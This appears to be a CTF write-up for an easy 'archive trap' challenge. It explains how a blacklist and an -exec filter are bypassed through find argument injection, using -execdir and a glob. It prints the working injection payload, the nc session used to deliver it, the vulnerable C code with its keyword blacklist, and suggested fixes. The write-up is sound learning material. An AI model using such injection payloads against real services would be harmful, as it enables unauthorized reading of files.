# archive trap — Writeup

**Flag**: `K17{n0t_so_s3cr3t_4rchive}`
**Category**: misc · easy · 100 pts
**Target**: `nc chal.secso.cc 3000`

## TL;DR

```
. -o -execdir cat /win/*.txt {} +
```

## 源码

`chal.c` —— 读入 pattern 后拼进 shell：

```c
int blocked(const char *s) {
    const char *bad[] = { ";", "|", "&", "`", "$", "(", ")", "<", ">",
                          "\n", "\r", "flag", "sh", "bash", NULL };
    for (int i = 0; bad[i]; i++) if (strstr(s, bad[i])) return 1;
    return 0;
}
// ...
snprintf(command, sizeof(command),
         "/bin/sh ./filter.sh ./box -maxdepth 1 -name %s -print", input);
system(command);
```

`filter.sh` —— 挡 find 的 `-exec`：

```sh
for arg in "$@"; do
    case "$arg" in
        -exec) echo "You don't have permission for that" >&2; exit 1 ;;
    esac
done
exec find "$@"
```

## 利用链

| # | 防护 | 绕过 |
|---|------|------|
| 1 | `filter.sh` 挡 `-exec` | 精确匹配漏了 `-execdir`（及 `-okdir`） |
| 2 | `chal.c` 挡字符串 `flag` | 写 glob `/win/*.txt`，原始输入不含 `flag`；`system()` 才展开 |
| 3 | `chal.c` 挡 `;` `\|` `&` 等 | 不需要；`-execdir ... {} +` 用 `+` 结尾 |
| 4 | 注入点固定在 `-name` 后 | `. -o <action>`：左分支恒假，短路到 action |

未加引号的 `%s` 让空格可以拆出新参数，等于把整个 find 命令行交出去。

## 命令展开结果

```
find ./box -maxdepth 1 -name . -o -execdir cat /win/*.txt {} + -print
                                        └─ 外层 sh 展开 ─┘ → /win/flag.txt
```

## 实测

```
$ printf '. -o -execdir cat /win/*.txt {} +\n' | nc chal.secso.cc 3000
=========[Archive Inspector]=========
Enter archive pattern: ./box
K17{n0t_so_s3cr3t_4rchive}cat: ./box: Is a directory
./box/notes.txt
K17{n0t_so_s3cr3t_4rchive}nothing important here, look for the flag instead
```

`./box/notes.txt` 的 "nothing important here, look for the flag instead" 是干扰项。

## 本地复现

```sh
mkdir -p box && touch box/victim.zip
echo 'KCTF{local}' > /tmp/win/flag.txt
gcc -o chal chal.c
printf '. -o -execdir cat /tmp/win/*.txt {} +\n' | ./chal
```

注意 `{}` 不能省 —— `-execdir cat X +` 会报 `find: missing argument to '-execdir'`。

## 修复建议

- 用 `execv`/`fork` 传参数组，别拼 shell 字符串；至少给 `%s` 加引号并转义。
- 黑名单不可靠：`-execdir`/`-okdir` 漏了；字符串黑名单对 glob 也无效。
- 正确做法是用 `-name` 的值做**数据**而非代码 —— 把 pattern 交给 `fnmatch()` 自己匹配，或给 find 传 `--` 并严格校验。
- 真要限制 find，应该禁用所有 action（`-exec*`、`-ok*`、`-delete`、`-fprintf`、`-fls`），而不只是 `-exec`。
